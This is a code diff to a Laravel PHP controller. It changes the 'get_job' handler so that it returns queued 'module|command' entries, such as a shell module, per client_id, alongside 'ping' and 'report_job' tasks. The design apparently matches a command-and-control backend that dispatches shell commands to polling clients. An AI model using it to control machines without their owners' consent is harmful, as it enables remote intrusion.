@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Commands;
 use Illuminate\Http\Request;
 
 class Main extends Controller
@@ -14,16 +15,32 @@ class Main extends Controller
 	 */
 	public function handle(Request $request)
 	{
-		$task = strtolower($request->json()->get('task'));
+		$task      = strtolower($request->json()->get('task'));
+		$client_id = $request->json()->get('client_id');
 
 		switch ($task)
 		{
 			case 'ping':
 				return response()->json('');
+
 			case 'get_job':
-				return response()->json('ShellModule|ls');
+				$response = [];
+				$commands = Commands::where([
+									['client_id', $client_id],
+									['result', '']
+								])
+								->orderBy('id', 'asc')
+								->get();
+
+				foreach ($commands as $command)
+				{
+					$response[] = $command->module.'|'.$command->command;
+				}
+
+				return response()->json($response);
+
 			case 'report_job':
-				break;
+				return response()->json('');
 		}
 
 		return response()->json(['error' => 'Forbidden'], 403);
